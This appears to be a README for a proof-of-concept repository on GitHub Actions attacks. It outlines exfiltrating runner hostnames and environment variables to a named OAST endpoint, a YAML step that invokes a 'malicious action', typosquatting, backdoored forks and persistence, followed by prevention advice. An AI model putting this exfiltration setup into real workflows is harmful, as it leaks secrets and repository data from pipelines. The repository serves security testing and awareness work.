# GitHub Actions Security PoC

This repository demonstrates GitHub Actions security vulnerabilities and attack techniques for professional security testing and awareness.

## ⚠️ WARNING

This repository contains security testing materials for **educational purposes only**. Use only on repositories you own or have explicit permission to test.

## Repository Structure

```
├── .github/workflows/
│   ├── data-exfiltration-demo.yml      # Hostname exfiltration to OAST endpoint
│   ├── malicious-action-usage.yml      # How to use malicious actions
│   ├── action-abuse-demo.yml           # Basic action abuse scenarios
│   └── advanced-action-abuse.yml       # Advanced attack techniques
├── malicious-action-demo/              # Complete malicious action example
│   ├── action.yml                      # Action metadata
│   ├── index.js                        # Malicious action code
│   └── README.md                       # Action documentation
├── malicious-action-example.md         # Attack techniques documentation
└── README.md                           # This file
```

## Quick Start

### 1. Data Exfiltration Demo
Run the workflow to send hostname data to your OAST endpoint:
```yaml
# Uses your OAST endpoint: pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com
```

### 2. Malicious Action Usage
Demonstrate how malicious actions can be used:
```yaml
- name: Malicious Data Exfiltration
  uses: ./malicious-action-demo
  with:
    target_endpoint: 'your-oast-endpoint.com'
    data_type: 'hostname'
```

## Attack Vectors Demonstrated

### 1. Data Exfiltration
- **Hostname Collection**: Gather runner hostname information
- **Environment Variables**: Access sensitive environment data
- **Repository Metadata**: Collect repository and actor information
- **Multiple Methods**: HTTP POST, DNS exfiltration

### 2. Action Abuse
- **Typosquatting**: Similar-named malicious actions
- **Supply Chain Attacks**: Compromising legitimate actions
- **Malicious Forks**: Adding backdoors to existing actions

### 3. Advanced Techniques
- **Reconnaissance**: Information gathering
- **Privilege Escalation**: Gaining elevated access
- **Persistence**: Maintaining access after workflow completion

## Security Testing

### Professional PoC Scenarios
1. **Controlled Environment**: Use isolated test repositories
2. **Ethical Testing**: Only test on authorized repositories
3. **Documentation**: Record all testing activities and findings

### OAST Integration
- **Endpoint**: `pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com`
- **Data Types**: Hostname, environment, repository info
- **Methods**: HTTP POST, DNS exfiltration

## Prevention Methods

### 1. Action Security
- **Pin Actions**: Always pin to specific commit SHAs
- **Review Code**: Check action source code before use
- **Trusted Sources**: Only use actions from trusted repositories
- **Dependency Scanning**: Scan for vulnerable actions

### 2. Runner Security
- **Self-Hosted Runners**: Use isolated runner environments
- **Network Restrictions**: Implement network policies
- **Least Privilege**: Use minimal required permissions
- **Monitoring**: Track runner activities and data exfiltration

### 3. Policy Enforcement
- **WIZ Policies**: Implement comprehensive security policies
- **Approval Workflows**: Require approval for action updates
- **Continuous Monitoring**: Monitor action usage and changes

## Usage Examples

### For Security Teams
- **Penetration Testing**: Use scenarios for red team exercises
- **Security Awareness**: Train developers on action security
- **Policy Development**: Create security policies based on findings

### For Developers
- **Best Practices**: Learn secure action usage patterns
- **Threat Awareness**: Understand potential attack vectors
- **Implementation**: Apply security controls in workflows

## Legal Notice

This repository is for educational and security testing purposes only. Users are responsible for:
- Obtaining proper authorization before testing
- Complying with applicable laws and regulations
- Following responsible disclosure practices
- Respecting terms of service and privacy policies

## References

- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitHub Actions Security](https://github.com/features/security)
